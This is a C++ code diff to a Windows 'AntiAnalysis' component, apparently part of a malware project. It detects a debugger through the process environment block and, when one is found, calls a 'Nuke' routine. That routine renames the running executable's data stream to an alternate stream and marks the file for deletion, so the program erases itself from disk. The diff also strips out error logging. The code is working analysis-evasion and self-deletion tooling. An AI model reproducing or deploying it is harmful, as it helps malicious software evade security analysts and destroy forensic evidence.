@@ -2,11 +2,11 @@
 #include "utils/headers/antianalysis.h"
 #include "utils/headers/Tools.h"
 
+#define NEW_STREAM L":a"
 
 bool AntiAnalysis::Peb(API::APIResolver& resolver)
 {
     PROCESS_BASIC_INFORMATION pbi;
-    Logging                     tools;
 
     API::API_ACCESS api = resolver.GetAPIAccess();
 
@@ -32,13 +32,13 @@ bool AntiAnalysis::Peb(API::APIResolver& resolver)
         }
         else
         {
-            tools.ShowError("Failed with code: ", GetLastError());
+           // tools.ShowError("Failed with code: ", GetLastError());
             return false;
         }
     }
     else
     {
-        tools.ShowError("Failed to get NtQueryInformationProcess address");
+        //tools.ShowError("Failed to get NtQueryInformationProcess address");
     }
 
     return false;
@@ -46,84 +46,70 @@ bool AntiAnalysis::Peb(API::APIResolver& resolver)
 
 bool AntiAnalysis::PebCheck(API::APIResolver& resolver)
 {
-    Logging logging;
     if (Peb(resolver)) {
-        logging.ShowError("Debugger Detected! Exiting");
-        //this->Nuke(); // TODO: fix function eventually
-        exit(60);
+        //MessageBoxA(NULL, "debugger", "debugger", NULL);
+        this->Nuke();
     }
     return false;
 }
 
+
 int AntiAnalysis::Nuke(void)
 {
-    HANDLE hFile = INVALID_HANDLE_VALUE;
-    const wchar_t* NEWSTREAM = L"test";
-    size_t RenameSize = sizeof(FILE_RENAME_INFO) + (wcslen(NEWSTREAM) + 1) * sizeof(wchar_t);
-    PFILE_RENAME_INFO PFRI = nullptr;
-    WCHAR PathSize[MAX_PATH * 2] = { 0 };
-    FILE_DISPOSITION_INFO SetDelete = { 0 };
-    Logging logging;
+    WCHAR                       szPath[MAX_PATH * 2] = { 0 };
+    FILE_DISPOSITION_INFO       dispinfo = { 0 };
+    HANDLE                      hFile = INVALID_HANDLE_VALUE;
+    PFILE_RENAME_INFO           pRename = NULL;
+    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
+    SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
+    SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;
 
-    PFRI = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);
+    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure
 
-    if (!PFRI)
-    {
-        logging.ShowError("Error allocating memory");
-        return 1;
-    }
+    if (!pRename) 
+        return FALSE;
+    
+    ZeroMemory(szPath, sizeof(szPath));
+    ZeroMemory(&dispinfo, sizeof(FILE_DISPOSITION_INFO));
 
-    ZeroMemory(PathSize, sizeof(PathSize));
-    ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));
+    dispinfo.DeleteFile = TRUE; // Mark file for deletion
 
-    SetDelete.DeleteFile = TRUE;
+    // Setting the new data stream name buffer and size 
+    pRename->FileNameLength = StreamLength;
+    RtlCopyMemory(pRename->FileName, NewStream, StreamLength);
 
-    PFRI->FileNameLength = wcslen(NEWSTREAM) * sizeof(wchar_t);
-    wcscpy_s(PFRI->FileName, wcslen(NEWSTREAM) + 1, NEWSTREAM);
+    // Get current file name
+    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) 
+        return FALSE;
+    
+    
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL); // Open handle to current file
 
-    if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0)
-    {
-        logging.ShowError("Failed to get file name: ", GetLastError());
-        HeapFree(GetProcessHeap(), 0, PFRI);
-        return 1;
-    }
-
-    hFile = CreateFileW(PathSize, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        logging.ShowError("Failed to open the file: ", GetLastError());
-        HeapFree(GetProcessHeap(), 0, PFRI);
-        return 1;
-    }
-
-    if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize))
-    {
-        logging.ShowError("Failed to rewrite file information: ", GetLastError());
-        CloseHandle(hFile);
-        HeapFree(GetProcessHeap(), 0, PFRI);
-        return 1;
-    }
+    if (hFile == INVALID_HANDLE_VALUE) 
+        return FALSE;
+    
+    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
+        return FALSE;
+    
 
     CloseHandle(hFile);
 
-    hFile = CreateFileW(PathSize, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        logging.ShowError("Failed to open the file again: ", GetLastError());
-        HeapFree(GetProcessHeap(), 0, PFRI);
-        return 1;
-    }
+    // Open new handle
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 
-    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete)))
-    {
-        logging.ShowError("Failed to set file disposition: ", GetLastError());
-        CloseHandle(hFile);
-        HeapFree(GetProcessHeap(), 0, PFRI);
-        return 1;
-    }
+    if (hFile == INVALID_HANDLE_VALUE) 
+        return FALSE;
+    
+
+    // Mark for deletion after file close
+    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &dispinfo, sizeof(dispinfo))) 
+        return FALSE;
+    
 
     CloseHandle(hFile);
-    HeapFree(GetProcessHeap(), 0, PFRI);
+    HeapFree(GetProcessHeap(), 0, pRename);
 
-    return 0;
+    return TRUE;
 }
+
+
